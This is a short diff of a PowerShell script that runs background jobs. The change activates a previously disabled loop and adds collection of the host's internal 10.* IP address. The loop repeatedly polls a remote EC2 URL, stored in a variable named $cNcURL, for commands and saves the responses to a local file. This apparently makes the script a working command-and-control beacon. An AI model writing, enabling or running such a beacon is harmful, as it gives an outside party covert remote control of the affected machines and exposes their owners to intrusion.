@@ -166,7 +166,8 @@ start-job -ScriptBlock{
 }
 
 start-job -scriptBlock {
-    while(1 -eq 2){
+    $hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")} | foreach{$_.IPAddress}
+    while(1 -eq 1){
         $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
         $httpCommand=invoke-restmethod $cNcURL
         $httpCommand | out-file -filepath .\rf.txt
